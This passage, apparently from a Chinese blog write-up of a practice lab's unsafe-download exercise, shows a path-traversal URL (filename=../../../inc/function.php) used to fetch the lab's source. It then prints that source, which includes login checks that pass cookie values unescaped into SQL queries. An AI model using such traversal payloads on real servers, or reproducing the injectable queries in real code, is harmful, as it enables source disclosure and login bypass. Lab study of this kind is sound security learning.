string">"Accept-Length:"</span><span class="token keyword">.</span><span class="token variable">$file_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Header<span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span>.basename<span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token variable">$buffer</span><span class="token operator">=</span>1024<span class="token punctuation">;</span><span class="token variable">$file_count</span><span class="token operator">=</span>0<span class="token punctuation">;</span>//向浏览器返回数据//循环读取文件流,然后返回到浏览器feof确认是否到EOFwhile<span class="token punctuation">(</span><span class="token operator">!</span>feof<span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file_count</span><span class="token operator">&lt;</span><span class="token variable">$file_size</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token variable">$file_con</span><span class="token operator">=</span>fread<span class="token punctuation">(</span><span class="token variable">$fp</span>,<span class="token variable">$buffer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_count</span>+<span class="token operator">=</span><span class="token variable">$buffer</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file_con</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>fclose<span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p>根据我们上面下载的代码进行测试我们可以看到的是里面有个inc&#x2F;function.php文件，试着构造URL下载。<a href="http://10.1.1.7/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php">http://10.1.1.7/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php</a></p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php //验证码<span class="token keyword">function</span> vcode<span class="token punctuation">(</span><span class="token variable">$width</span><span class="token operator">=</span>120,<span class="token variable">$height</span><span class="token operator">=</span>40,<span class="token variable">$fontSize</span><span class="token operator">=</span>30,<span class="token variable">$countElement</span><span class="token operator">=</span>5,<span class="token variable">$countPixel</span><span class="token operator">=</span>100,<span class="token variable">$countLine</span><span class="token operator">=</span>4<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    header<span class="token punctuation">(</span><span class="token string">'Content-type:image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$element</span><span class="token operator">=</span>array<span class="token punctuation">(</span><span class="token string">'a'</span>,<span class="token string">'b'</span>,<span class="token string">'c'</span>,<span class="token string">'d'</span>,<span class="token string">'e'</span>,<span class="token string">'f'</span>,<span class="token string">'g'</span>,<span class="token string">'h'</span>,<span class="token string">'i'</span>,<span class="token string">'j'</span>,<span class="token string">'k'</span>,<span class="token string">'m'</span>,<span class="token string">'n'</span>,<span class="token string">'o'</span>,<span class="token string">'p'</span>,<span class="token string">'q'</span>,<span class="token string">'r'</span>,<span class="token string">'s'</span>,<span class="token string">'t'</span>,<span class="token string">'u'</span>,<span class="token string">'v'</span>,<span class="token string">'w'</span>,<span class="token string">'x'</span>,<span class="token string">'y'</span>,<span class="token string">'z'</span>,<span class="token string">'0'</span>,<span class="token string">'1'</span>,<span class="token string">'2'</span>,<span class="token string">'3'</span>,<span class="token string">'4'</span>,<span class="token string">'5'</span>,<span class="token string">'6'</span>,<span class="token string">'7'</span>,<span class="token string">'8'</span>,<span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$string</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span>0<span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$countElement</span><span class="token punctuation">;</span><span class="token variable">$i</span>++<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$string</span>.<span class="token operator">=</span><span class="token variable">$element</span><span class="token punctuation">[</span>rand<span class="token punctuation">(</span>0,count<span class="token punctuation">(</span><span class="token variable">$element</span><span class="token punctuation">)</span>-1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token variable">$img</span><span class="token operator">=</span>imagecreatetruecolor<span class="token punctuation">(</span><span class="token variable">$width</span>, <span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$colorBg</span><span class="token operator">=</span>imagecolorallocate<span class="token punctuation">(</span><span class="token variable">$img</span>,rand<span class="token punctuation">(</span>200,255<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>200,255<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>200,255<span class="token punctuation">))</span><span class="token punctuation">;</span>    <span class="token variable">$colorBorder</span><span class="token operator">=</span>imagecolorallocate<span class="token punctuation">(</span><span class="token variable">$img</span>,rand<span class="token punctuation">(</span>200,255<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>200,255<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>200,255<span class="token punctuation">))</span><span class="token punctuation">;</span>    <span class="token variable">$colorString</span><span class="token operator">=</span>imagecolorallocate<span class="token punctuation">(</span><span class="token variable">$img</span>,rand<span class="token punctuation">(</span>10,100<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>10,100<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>10,100<span class="token punctuation">))</span><span class="token punctuation">;</span>    imagefill<span class="token punctuation">(</span><span class="token variable">$img</span>,0,0,<span class="token variable">$colorBg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    for<span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span>0<span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$countPixel</span><span class="token punctuation">;</span><span class="token variable">$i</span>++<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        imagesetpixel<span class="token punctuation">(</span><span class="token variable">$img</span>,rand<span class="token punctuation">(</span>0,<span class="token variable">$width</span>-1<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>0,<span class="token variable">$height</span>-1<span class="token punctuation">)</span>,imagecolorallocate<span class="token punctuation">(</span><span class="token variable">$img</span>,rand<span class="token punctuation">(</span>100,200<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>100,200<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>100,200<span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    for<span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span>0<span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$countLine</span><span class="token punctuation">;</span><span class="token variable">$i</span>++<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        imageline<span class="token punctuation">(</span><span class="token variable">$img</span>,rand<span class="token punctuation">(</span>0,<span class="token variable">$width</span>/2<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>0,<span class="token variable">$height</span><span class="token punctuation">)</span>,rand<span class="token punctuation">(</span><span class="token variable">$width</span>/2,<span class="token variable">$width</span><span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>0,<span class="token variable">$height</span><span class="token punctuation">)</span>,imagecolorallocate<span class="token punctuation">(</span><span class="token variable">$img</span>,rand<span class="token punctuation">(</span>100,200<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>100,200<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>100,200<span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    //imagestring<span class="token punctuation">(</span><span class="token variable">$img</span>,5,0,0,<span class="token string">'abcd'</span>,<span class="token variable">$colorString</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    imagettftext<span class="token punctuation">(</span><span class="token variable">$img</span>,<span class="token variable">$fontSize</span>,rand<span class="token punctuation">(</span>-5,5<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>5,15<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>30,35<span class="token punctuation">)</span>,<span class="token variable">$colorString</span>,<span class="token string">'../assets/fonts/ManyGifts.ttf'</span>,<span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    imagejpeg<span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    imagedestroy<span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>//之前的验证码有点问题，重新从网上搜了一个简单的验证码函数，是的，从网上搜的。<span class="token keyword">function</span> vcodex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789"</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        for<span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span>0<span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span>6<span class="token punctuation">;</span><span class="token variable">$i</span>++<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$pos</span> <span class="token operator">=</span> rand<span class="token punctuation">(</span>0,35<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$str</span> .<span class="token operator">=</span> <span class="token variable">$string</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;$pos&amp;#125;;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    //session_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img_number'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$str</span><span class="token punctuation">;</span>        <span class="token variable">$img_handle</span> <span class="token operator">=</span> Imagecreate<span class="token punctuation">(</span>80, 20<span class="token punctuation">)</span><span class="token punctuation">;</span>  //图片大小80X20        <span class="token variable">$back_color</span> <span class="token operator">=</span> ImageColorAllocate<span class="token punctuation">(</span><span class="token variable">$img_handle</span>, 255, 255, 255<span class="token punctuation">)</span><span class="token punctuation">;</span> //背景颜色（白色）        <span class="token variable">$txt_color</span> <span class="token operator">=</span> ImageColorAllocate<span class="token punctuation">(</span><span class="token variable">$img_handle</span>, 0,0, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>  //文本颜色（黑色）        //加入干扰线        for<span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span>0<span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span>3<span class="token punctuation">;</span><span class="token variable">$i</span>++<span class="token punctuation">)</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$line</span> <span class="token operator">=</span> ImageColorAllocate<span class="token punctuation">(</span><span class="token variable">$img_handle</span>,rand<span class="token punctuation">(</span>0,255<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>0,255<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>0,255<span class="token punctuation">))</span><span class="token punctuation">;</span>            Imageline<span class="token punctuation">(</span><span class="token variable">$img_handle</span>, rand<span class="token punctuation">(</span>0,15<span class="token punctuation">)</span>, rand<span class="token punctuation">(</span>0,15<span class="token punctuation">)</span>, rand<span class="token punctuation">(</span>100,150<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>10,50<span class="token punctuation">)</span>, <span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    //加入干扰象素        for<span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span>0<span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span>200<span class="token punctuation">;</span><span class="token variable">$i</span>++<span class="token punctuation">)</span>         <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$randcolor</span> <span class="token operator">=</span> ImageColorallocate<span class="token punctuation">(</span><span class="token variable">$img_handle</span>,rand<span class="token punctuation">(</span>0,255<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>0,255<span class="token punctuation">)</span>,rand<span class="token punctuation">(</span>0,255<span class="token punctuation">))</span><span class="token punctuation">;</span>            Imagesetpixel<span class="token punctuation">(</span><span class="token variable">$img_handle</span>, rand<span class="token punctuation">(</span><span class="token punctuation">)</span>%100 , rand<span class="token punctuation">(</span><span class="token punctuation">)</span>%50 , <span class="token variable">$randcolor</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        Imagefill<span class="token punctuation">(</span><span class="token variable">$img_handle</span>, 0, 0, <span class="token variable">$back_color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             //填充图片背景色        ImageString<span class="token punctuation">(</span><span class="token variable">$img_handle</span>, 28, 10, 0, <span class="token variable">$str</span>, <span class="token variable">$txt_color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//水平填充一行字符串        ob_clean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   // ob_clean<span class="token punctuation">(</span><span class="token punctuation">)</span>清空输出缓存区            header<span class="token punctuation">(</span><span class="token string">"Content-type: image/png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //生成验证码图片            Imagepng<span class="token punctuation">(</span><span class="token variable">$img_handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//显示图片    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>//生成一个token,以当前微妙时间+一个5位的前缀<span class="token keyword">function</span> set_token<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>       unset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">'.'</span>,<span class="token string">''</span>,uniqid<span class="token punctuation">(</span>mt_rand<span class="token punctuation">(</span>10000,99999<span class="token punctuation">)</span>,true<span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>//跳转页面<span class="token keyword">function</span> skip<span class="token punctuation">(</span><span class="token variable">$notice</span>,<span class="token variable">$url</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token variable">$html</span><span class="token operator">=</span><span class="token operator">&lt;&lt;&lt;</span>A<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span><span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html; charset=utf-8"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"refresh"</span> content<span class="token operator">=</span><span class="token string">"2;URL=&amp;#123;<span class="token variable">$url</span>&amp;#125;"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>notice<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>link rel<span class="token operator">=</span><span class="token string">"stylesheet"</span> type<span class="token operator">=</span><span class="token string">"text/css"</span> href<span class="token operator">=</span><span class="token string">"../../../style/header.css"</span>/<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>p id<span class="token operator">=</span><span class="token string">'op_notice'</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;$notice&amp;#125; | &lt;a href='&amp;#123;$url&amp;#125;'>点击快速返回&lt;/a>&lt;/p></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span>A<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>//在访问一个页面时，先验证是否登录,csrf里面，使用的是session验证<span class="token keyword">function</span> check_csrf_login<span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'csrf'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'csrf'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select * from member where username='&amp;#123;<span class="token variable">$_SESSION</span>['csrf']['username']&amp;#125;' and sha1(pw)='&amp;#123;<span class="token variable">$_SESSION</span>['csrf']['password']&amp;#125;'"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span>execute<span class="token punctuation">(</span><span class="token variable">$link</span>,<span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>mysqli_num_rows<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">==</span>1<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>//在访问一个页面时，先验证是否登录,sqli的insert,update问题里面，使用的是session验证<span class="token keyword">function</span> check_sqli_session<span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sqli'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sqli'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select * from member where username='&amp;#123;<span class="token variable">$_SESSION</span>['sqli']['username']&amp;#125;' and sha1(pw)='&amp;#123;<span class="token variable">$_SESSION</span>['sqli']['password']&amp;#125;'"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span>execute<span class="token punctuation">(</span><span class="token variable">$link</span>,<span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>mysqli_num_rows<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">==</span>1<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>//在访问一个页面时，先验证是否登录,sqli里面，使用的是cookie验证<span class="token keyword">function</span> check_sqli_login<span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> isset<span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        //这里如果不对获取的cookie进行转义，则会存在SQL注入漏洞，也会导致验证被绕过        //<span class="token variable">$username</span><span class="token operator">=</span>escape<span class="token punctuation">(</span><span class="token variable">$link</span>, <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        //<span class="token variable">$password</span><span class="token operator">=</span>escape<span class="token punctuation">(</span><span class="token variable">$link</span>, <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select * from users where username='<span class="token variable">$username</span>' and sha1(password)='<span class="token variable">$password</span>'"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span>execute<span class="token punctuation">(</span><span class="token variable">$link</span>,<span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>mysqli_num_rows<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">==</span>1<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$data</span><span class="token operator">=</span>mysqli_fetch_assoc<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>/*xss里面的logincheck*/<span class="token keyword">function</span> check_xss_login<span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> isset<span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        //这里如果不对获取的cookie进行转义，则会存在SQL注入漏洞，也会导致验证被绕过        <span class="token variable">$username</span><span class="token operator">=</span>escape<span class="token punctuation">(</span><span class="token variable">$link</span>, <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$password</span><span class="token operator">=</span>escape<span class="token punctuation">(</span><span class="token variable">$link</span>, <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//         <span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>//         <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select * from users where username='<span class="token variable">$username</span>' and sha1(password)='<span class="token variable">$password</span>'"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span>execute<span class="token punctuation">(</span><span class="token variable">$link</span>,<span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>mysqli_num_rows<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">==</span>1<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$data</span><span class="token operator">=</span>mysqli_fetch_assoc<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>/*op1的check login*/<span class="token keyword">function</span> check_op_login<span class="token punctuation">(</span><span class="token 